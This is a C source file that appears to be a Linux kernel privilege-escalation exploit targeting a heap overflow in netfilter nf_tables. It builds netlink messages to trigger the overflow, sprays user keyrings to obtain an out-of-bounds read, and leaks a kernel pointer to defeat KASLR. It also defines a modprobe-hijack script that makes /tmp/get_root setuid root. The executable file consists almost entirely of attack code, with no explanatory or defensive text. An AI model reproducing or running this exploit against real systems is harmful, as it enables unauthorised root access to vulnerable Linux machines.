#define _GNU_SOURCE
#include <arpa/inet.h>
#include <limits.h>
#include <linux/netlink.h>
#include <linux/keyctl.h>
#include <stdint.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <semaphore.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/io_uring.h>

#define IO_RING_CTX_REF_FREE_OFFSET 0x3dfa00

#define IO_RSRC_NODE_REF_ZERO_OFFSET 0x3e04f0

#define KEY_DESC_MAX_SIZE 40

#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16

#define SPRAY_KEY_SIZE 50
#define SPRAY_SIZE 300
#define SPRAY_NB_ENTRIES 10

#define PHYSMAP_MASK 0xffffffff00000000

#define KEY_PAYLOAD_SIZE 32 + 1 - 24
#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16
#define SPRAY_KEY_CNT 150

#define FREE_HOLE_BEGIN 100
#define FREE_HOLE_STEP 10

#define CORRUPT_SIZE USHRT_MAX

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE_NAME "table\0\0"

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

struct fd_uring {
    int fd;
    struct io_uring_params *params;
};

struct leak {
    long kaslr_base;
    long physmap_base;
};

#define XATTR_FILE "/tmp/tmpfs/a"
#define XATTR_VALUE "value"

#define XATTR_DELETION_NAME "security.Iwanttoberoot"

#define ATTRIBUTE_NAME_LEN 0x100
#define COMMAND_MAX_LEN 0x100

#define PREFIX_BUFFER_LEN 16

struct write4_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *next;
    void *prev;
    uint8_t name_offset;
} __attribute__((packed));

typedef int32_t key_serial_t;

#define KEY_DESC_MAX_SIZE 40

typedef int32_t key_serial_t;

const uint8_t zerobuf[0x40] = {0};

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}
static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}
static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}
static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

#define NETLINK_RECEIVE_BUFFER_SIZE 4096

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } while(0)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)
#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16)
#define FILENAME_MAX_LEN 0x80

const char dummy_file[] = "/tmp/dummy\0";

const char dummy_content[] = "\xff\xff\xff\xff";
const char new_modprobe_content[] = "#!/bin/bash\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";

sem_t *shell_barrier;

uint64_t leak_ptr;

struct nlmsghdr *get_batch_begin_nlmsg(void) {

    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;

    /* Used to access to the netfilter tables subsystem */
    nfgm->res_id = NFNL_SUBSYS_NFTABLES;

    return nlh;
}

/**
 * get_batch_end_nlmsg(): Construct a BATCH_END message for the netfilter netlink
 */
struct nlmsghdr *get_batch_end_nlmsg(void) {

    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    return nlh;
}

/**
 * set_nested_attr(): Prepare a nested netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the nested attribute
 * @data_len: Length of the nested attribute
 */
struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, uint16_t data_len) {
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
    return (void *)attr + sizeof(struct nlattr);
}

/**
 * set_u32_attr(): Prepare an integer netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @value: Value of this attribute
 */
struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t value) {
    attr->nla_type = type;
    attr->nla_len = U32_NLA_SIZE;
    *(uint32_t *)NLA_ATTR(attr) = htonl(value);

    return (void *)attr + U32_NLA_SIZE;
}

 /**
 * set_u64_attr(): Prepare a 64 bits integer netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @value: Value of this attribute
 */
struct nlattr *set_u64_attr(struct nlattr *attr, uint16_t type, uint64_t value) {
    attr->nla_type = type;
    attr->nla_len = U64_NLA_SIZE;
    *(uint64_t *)NLA_ATTR(attr) = htobe64(value);

    return (void *)attr + U64_NLA_SIZE;
}

/**
 * set_str8_attr(): Prepare a 8 bytes long string netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @name: Buffer to copy into the attribute
 */
struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const char name[8]) {
    attr->nla_type = type;
    attr->nla_len = S8_NLA_SIZE;
    memcpy(NLA_ATTR(attr), name, 8);

    return (void *)attr + S8_NLA_SIZE;
}

/**
 * set_binary_attr(): Prepare a byte array netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @buffer: Buffer with data to send
 * @buffer_size: Size of the previous buffer
 */
struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, uint8_t *buffer, uint64_t buffer_size) {
    attr->nla_type = type;
    attr->nla_len = NLA_BIN_SIZE(buffer_size);
    memcpy(NLA_ATTR(attr), buffer, buffer_size);

    return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}

void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* Netlink batch_begin message preparation */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        do_error_exit("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    /** Prepare associated attribute **/
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

    /* Netlink batch_end message preparation */
    nlh_batch_end = get_batch_end_nlmsg();

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

/**
 * create_set(): Create a netfilter set
 * @sock: Socket used to communicate throught the netfilter netlink
 * @set_name: Name of the created set
 * @set_keylen: Length of the keys of this set. Used in the exploit to control the used cache
 * @data_len: Length of stored data. Used to control the size of the overflow
 * @table_name: Name of the table that stores this set
 * @id: ID of the created set
 */
void create_set(int sock, const char *set_name, uint32_t set_keylen, uint32_t data_len, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    struct iovec iov[3];

    /* Prepare the netlink sockaddr for msg */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* First netlink message: batch_begin */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Second netlink message : Set attributes */
    nlh_payload_size = sizeof(struct nfgenmsg);                                     // Mandatory
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_TABLE
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_NAME
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_ID
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_KEY_LEN
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_FLAGS
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_DATA_TYPE
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_DATA_LEN
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        do_error_exit("malloc");

    memset(nlh_payload, 0, nlh_payload_size);

    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;

    
    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

    /* Last netlink message: batch_end */
    nlh_batch_end = get_batch_end_nlmsg();

    /* Setup the iovec */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Prepare the message to send */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Send message */
    sendmsg(sock, &msg, 0);

    /* Free allocated memory */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

/**
 * add_elem_to_set(): Trigger the heap buffer overflow
 * @sock: Socket used to communicate throught the netfilter netlink
 * @set_name: Name of the set to add the element
 * @set_keylen: Length of the keys of the previous set
 * @table_name: Table associated to the preiv
 * @id: ID of the previous set
 * @data_len: Length of the data to copy. (= Size of the overflow - 16 )
 * @data: Data used for the overflow
 *
 * Submit two elements to add to the set.
 * The first one is used to setup the data payload
 * The second will trigger the overflow
 */
void add_elem_to_set(int sock, const char *set_name, uint32_t set_keylen, const char *table_name, uint32_t id, uint32_t data_len, uint8_t *data) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    uint64_t nested_attr_size;
    size_t first_element_size;
    size_t second_element_size;
    struct iovec iov[3];

    /* Prepare the netlink sockaddr for msg */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

    /* First netlink message: batch */
    nlh_batch_begin = get_batch_begin_nlmsg();

    /* Second netlink message : Set attributes */

    /** Precompute the size of the nested field **/
    nested_attr_size = 0;

    /*** First element ***/
    nested_attr_size += sizeof(struct nlattr);                                      // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);                                      // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen);                                   // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);                                      // NFTA_SET_ELEM_DATA
    nested_attr_size += NLA_ALIGN(NLA_BIN_SIZE(data_len));                          // NFTA_DATA_VALUE
    first_element_size = nested_attr_size;

    /*** Second element ***/
    nested_attr_size += sizeof(struct nlattr);                                      // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);                                      // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen);                                   // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);                                      // NFTA_SET_ELEM_DATA
    nested_attr_size += sizeof(struct nlattr);                                      // NFTA_DATA_VERDICT
    nested_attr_size += U32_NLA_SIZE;                                               // NFTA_VERDICT_CODE
    second_element_size = nested_attr_size - first_element_size;

    nlh_payload_size = sizeof(struct nfgenmsg);                                     // Mandatory
    nlh_payload_size += sizeof(struct nlattr);                                      // NFTA_SET_ELEM_LIST_ELEMENTS
    nlh_payload_size += nested_attr_size;                                           // All the stuff described above
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_ELEM_LIST_TABLE
    nlh_payload_size += S8_NLA_SIZE;                                                // NFTA_SET_ELEM_LIST_SET
    nlh_payload_size += U32_NLA_SIZE;                                               // NFTA_SET_ELEM_LIST_SET_ID
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    /** Allocation **/
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload) {
        do_error_exit("malloc");
    }
    memset(nlh_payload, 0, nlh_payload_size);

    /** Fill the required fields **/
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST;
    nlh_payload->nlmsg_seq = 0;

    /** Setup the nfgenmsg **/
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    /** Setup the attributes */
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);

    /*** First element ***/
    attr = set_nested_attr(attr, 0, first_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, NLA_BIN_SIZE(data_len));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)data, data_len);

    /*** Second element ***/
    attr = set_nested_attr(attr, 0, second_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + sizeof(struct nlattr));
    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
    set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

    /* Last netlink message: End of batch */
    nlh_batch_end = get_batch_end_nlmsg();

    /* Setup the iovec */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    /* Prepare the message to send */
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    /* Send message */
    sendmsg(sock, &msg, 0);

    /* Free allocated memory */
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

key_serial_t *spray_keyring(uint32_t spray_size) {
    char key_desc[KEY_DESC_MAX_SIZE];
    char key_payload[KEY_PAYLOAD_SIZE + 1] = {0};
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, sizeof(key_desc), "spray_key_%d", i);
        memset(key_payload, 'A', KEY_PAYLOAD_SIZE);
        for (int j = 0; j < 3; j++) {
            id_buffer[i] = add_key("user", key_desc, key_payload, strlen(key_payload), KEY_SPEC_PROCESS_KEYRING);
            if (id_buffer[i] < 0) {
                usleep(100 * 1000); // 100ms
            } else {
                break;
            }
        }

        if (id_buffer[i] < 0) {
            printf("add_key %d", i);
        }
    }

    return id_buffer;
}

key_serial_t found_oob(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            do_error_exit("keyctl");

        if (keylen == USHRT_MAX) {
            printf("[+] found oob keyring id %d\n", id_buffer[i]);
            return id_buffer[i];
        }
    }
    return 0;
}

/**
 * set_cpu_affinity(): Pin a process to a CPU
 * @cpu_n: CPU to use
 * @pid: pid of the process to attach
 */
void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        do_error_exit("sched_setaffinity");
}

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        do_error_exit("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        do_error_exit("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void release_key(key_serial_t id_buffer) {
    if (id_buffer) {
        if (keyctl(KEYCTL_REVOKE, id_buffer, 0, 0, 0) < 0) {
            do_error_exit("keyctl(KEYCTL_REVOKE): %m");
        }
    }
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }

    free(id_buffer);
}

uint64_t get_keyring_leak(key_serial_t id_buffer) {
    uint8_t buffer[CORRUPT_SIZE] = {0};
    int32_t keylen;

    keylen = keyctl(KEYCTL_READ, id_buffer, (long)buffer, CORRUPT_SIZE, 0);
    if (keylen < 0) {
        do_error_exit("keyctl: %m");
    }

    if (keylen == CORRUPT_SIZE) {
        char *ptr = buffer;
        ptr += (128 - 24);
        while (ptr < (char *)buffer + CORRUPT_SIZE - 128) {
            if ((*(uint64_t *)(ptr + 0x18) == 0x4141414141414141) &&
                (*(uint64_t *)(ptr + 8) != 0)) {
                puts("[+] find user_key_payload rcu.func!");
                return *(uint64_t *)(ptr + 8); // user_free_payload_rcu
            }
            ptr += 128;
        }
    }
    return 0;
}

int main(void){
    int sock;
    struct sockaddr_nl snl;
    struct write4_payload payload;
    struct keyring_payload leak_payload;
    struct fd_uring *fd_buffer;
    key_serial_t *id_buffer;
    char *xattr_target_filename;
    key_serial_t corrupted_key_id = 0;

    set_cpu_affinity(0, 0);
    init_namespace();
    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        do_error_exit("socket");
    }
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0)
        do_error_exit("bind");

    create_table(sock, TABLE_NAME);
    printf("[+] Table %s created\n", TABLE_NAME);

    create_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, sizeof(struct keyring_payload), TABLE_NAME, ID);
    printf("[+] Set for the leak created\n");

    create_set(sock, SET_NAME, KMALLOC64_KEYLEN, sizeof(struct write4_payload), TABLE_NAME, ID + 1);
    printf("[+] Set for write primitive created\n");

    memset(&leak_payload, 0, sizeof(struct keyring_payload));
    leak_payload.len = USHRT_MAX;

    while(1){
        id_buffer = spray_keyring(SPRAY_KEY_CNT);
        add_elem_to_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID, sizeof(struct keyring_payload), (uint8_t *)&leak_payload);
        corrupted_key_id = found_oob(id_buffer, SPRAY_KEY_CNT);
        if(corrupted_key_id != 0) break;
        else{
            puts("[+] spray fail.. retry");
            release_keys(id_buffer, SPRAY_KEY_CNT);
        }
    }
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i++) {
        if (id_buffer[i] == corrupted_key_id) {
            continue;
        }
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }
    leak_ptr = get_keyring_leak(corrupted_key_id); // proc_fs_context_ops
    if (!leak_ptr) {
        puts("[-] leak rcu.func failed");
        for (int i = 0; i < SPRAY_KEY_CNT; i++) {
            release_key(id_buffer[i]);
            id_buffer[i] = 0;
        }
        return 1;
    }

    printf("[+] leak user_free_payload_rcu: 0x%08lx\n", leak_ptr);

    return 0;
}